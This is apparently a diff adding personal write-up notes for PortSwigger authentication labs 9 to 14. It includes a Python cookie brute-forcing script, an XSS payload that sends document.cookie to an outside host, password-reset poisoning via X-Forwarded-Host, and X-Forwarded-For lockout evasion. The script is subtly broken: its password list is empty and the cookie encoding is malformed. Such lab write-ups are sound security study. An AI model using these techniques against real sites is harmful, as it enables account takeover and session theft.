@@ -500,4 +500,287 @@ MFA: 0449
 
 ![](imgs/2023-10-12-17-22-04.png)
 
-### Lab 09
+### Lab 09: Brute-forcing a stay-logged-in cookie
+[Link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
+
+![](imgs/2023-10-12-22-37-56.png)
+
+This lab allows users to stay logged in even after they close their browser session. The cookie is the key i can use to brute force the credentials of user "carlos".
+
+![](imgs/2023-10-12-22-41-52.png)
+
+In the request header, there is a "stay-logged-in" cookie that indentify the session is saced for the next login attempt.
+
+
+Cookie: ```d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw```
+
+After decode base64: ```wiener:51dc30ddc473d43a6011e9ebba6ca770```
+
+The ```51dc30ddc473d43a6011e9ebba6ca770``` is the hash of user "wiener" password.
+![](imgs/2023-10-12-22-54-37.png)
+
+```
+import base64
+import hashlib
+import requests
+import concurrent.futures
+
+url = "https://0aea00c603b23a6680f1fe9e00180025.web-security-academy.net/login"
+
+headers = {
+    "Host": "0aea00c603b23a6680f1fe9e00180025.web-security-academy.net",
+    "Cookie": "session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
+    "Referer": "https://0aea00c603b23a6680f1fe9e00180025.web-security-academy.net/login",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "en-US,en;q=0.9",
+}
+
+password = []
+
+def calculate_md5(text):
+    md5 = hashlib.md5()
+    md5.update(text.encode("utf-8"))
+    return md5.hexdigest()
+
+def calculate_base64(text):
+    base64_encoded = base64.b64encode(text.encode("utf-8"))
+    return str(base64_encoded)
+
+def send_request(username, password):
+    # Create a session object
+    session = requests.Session()
+
+    # Define the cookie parameters
+    cookie_name = bytes('stay-logged-in', encoding='utf-8')
+
+    # Calculate the cookie value
+    md5_passwd = calculate_md5(password)
+    b64_stay_logged_in = calculate_base64("carlos:" + md5_passwd)
+
+    # Set the cookie in the session
+    session.cookies.set("stay-logged-in", b64_stay_logged_in)
+
+    # Define the request payload
+    data = {
+        "username": username,
+        "password": password,
+        "stay-logged-in": "on",
+    }
+
+    # Make a request with the session
+    response = session.post(url, headers=headers, data=data)
+
+    # Process the response
+    output_string = "{} {} {} {} {}\n".format(
+        response.status_code, len(response.text), username, password, b64_stay_logged_in
+    )
+
+    with open("output_lab_9.txt", "a+") as file:
+        file.write(output_string)
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    for j in password:
+        executor.submit(send_request, "carlos", j)
+```
+
+![](imgs/2023-10-12-23-31-54.png)
+
+Done :v
+
+### Lab 10: Offline password cracking
+[Link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
+
+he lab contains an XSS vulnerability in the comment functionality.
+Pick a random post, you can see the comment section below.
+![](imgs/2023-10-13-04-31-40.png)
+
+So i can insert a XSS injection into the comment section.
+
+First, i tried the alert() script.
+
+```
+<script>alert(document.cookie);</script>
+```
+![](imgs/2023-10-13-04-34-37.png)
+
+So the script was executed? Note that there is a exploit server of the lab that tell you access logs of the lab.
+
+```
+<script>
+document.write('<img src="https://0aba005f0351630182d1240000540088.web-security-academy.net/'+document.cookie+'" />');
+</script>
+```
+
+![](imgs/2023-10-13-04-37-48.png)
+
+Access logs now full of request to the 'cookie' directory of the lab :> ofc, it not exists.
+
+stay-logged-in: ```Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz```
+
+b64 decode: ```carlos:26323c16d5f4dabff3bb136f2460a943```
+
+![](imgs/2023-10-13-04-41-27.png)
+
+-> "carlos" password: ```onceuponatime```
+
+![](imgs/2023-10-13-04-42-27.png)
+
+![](imgs/2023-10-13-04-42-51.png)
+
+### Lab 11: Password reset poisoning via middleware
+[Link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
+
+Let find out how the password reset functionality works!
+
+![](imgs/2023-10-13-12-53-15.png)
+
+The password reset asekd you to enter the user name or email.
+
+![](imgs/2023-10-13-12-54-08.png)
+
+There is an email sent to the user mailbox. This email contains the reset password link look like below:
+```
+https://[LAB URL]/forgot-password?temp-forgot-password-token=[TOKEN]
+```
+
+![](imgs/2023-10-13-12-56-48.png)
+![](imgs/2023-10-13-12-56-04.png)
+
+A POST request was sent to the server for updating your password. The request contains the token we mentioned above and new password. So we need to know the token to send a update password request.
+
+How can i get the token from the server? The server just sends the token to the lab url only?
+
+![](imgs/2023-10-13-13-02-43.png)
+
+When requesting a password reset request, i add the "X-Forwarded-Host" header to the request. The value is my server's host. It means that the server will send the token to my server's host, and i get the token to create a custom password update request for another user (i.e. 'carlos' user) :>
+
+![](imgs/2023-10-13-13-09-12.png)
+
+![](imgs/2023-10-13-13-09-36.png)
+
+Yes, i got the token :>
+
+![](imgs/2023-10-13-13-10-59.png)
+
+I sent a request to update 'carlos' password. Now 'carlos' password is 'peter'
+
+![](imgs/2023-10-13-13-11-52.png)
+
+### Lab 12: Password brute-force via password change
+[Link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
+
+This lab's password change functionality makes it vulnerable to brute-force attacks.
+
+The POST request to change the user's password:
+![](imgs/2023-10-13-22-28-03.png)
+
+What if the current password is incorrect? 
+![](imgs/2023-10-13-22-28-59.png)
+
+-> The response code is 302 :> We back to the login page :>
+
+So i can brute force the password by sending the change password request
+
+![](imgs/2023-10-13-23-03-04.png)
+
+I add "X-Forwarded-For" header to bypass ip brute force detection.
+
+If the password is correct, the response will contain "New passwords do not match" :>
+
+![](imgs/2023-10-13-23-04-58.png)
+
+-> So the password is "abc123"
+
+![](imgs/2023-10-13-23-05-34.png)
+
+### Lab 13: Broken brute-force protection, multiple credentials per request
+[Link](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)
+
+```
+function jsonSubmit(loginPath) {
+    const formToJSON = elements => [].reduce.call(elements, (data, element) => {
+        if (element.name && element.name.length > 0) {
+            data[element.name] = element.value;
+        }
+        return data;
+    }, {});
+
+    const jsonObject = formToJSON(document.getElementsByClassName("login-form")[0].elements)
+    const formData = JSON.stringify(jsonObject);
+    fetch(
+        loginPath,
+        {
+            method: "POST",
+            body: formData,
+            headers: {
+                "Content-Type": "application/json"
+            },
+        }
+    )
+        .then(response => {
+            response.text().then(t => {
+                document.open();
+                document.write(t);
+                document.close();
+            });
+
+            if (response.redirected) {
+                history.pushState({}, "", response.url)
+            }
+        });
+}
+```
+
+The login-form was sent to the server as an JSON data object.
+The lab has brute force detection.
+
+What happens if I set a set of passwords?
+![](imgs/2023-10-14-21-58-01.png)
+
+Still works? :> 
+
+![](imgs/2023-10-14-22-00-30.png)
+
+Wow :> So i can login to 'carlos' user by send a request that contains all possible passwords.
+
+![](imgs/2023-10-14-22-01-29.png)
+
+![](imgs/2023-10-14-22-02-08.png)
+
+### Lab 14: 2FA bypass using a brute-force attack
+[Link](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)
+
+![](imgs/2023-10-14-22-31-43.png)
+When login with the credentials "carlos:montoya", you will have a csrf token, then a POST request that contains the csrf token + mfa code was sent to the server.
+-> We need to find the csrf token after each GET request.
+
+To do this, we can use BurpSuite Macros Recorder, ZAP ....
+I tried to use BurpSuite but nohope :>
+
+So i used ZAP to automatically find csrf tokens and send the requests
+
+My ZAP script configuration:
+![](imgs/2023-10-15-23-00-58.png)
+
+Grab a cup of coffee and wait for the magic ....
+![](imgs/2023-10-15-23-02-53.png)
+
+And ????
+![](imgs/2023-10-15-23-17-37.png)
+
+![](imgs/2023-10-15-23-18-22.png)
+
+-> MFA Code is 0233
+
+Take the cookie session of the last response to login as user 'carlos'
+
+![](imgs/2023-10-15-23-22-53.png)
+
+![](imgs/2023-10-15-23-23-21.png)
+
+And i login as user 'carlos' successfully 
+![](imgs/2023-10-15-23-23-48.png)
+
+![](imgs/2023-10-15-23-24-36.png)
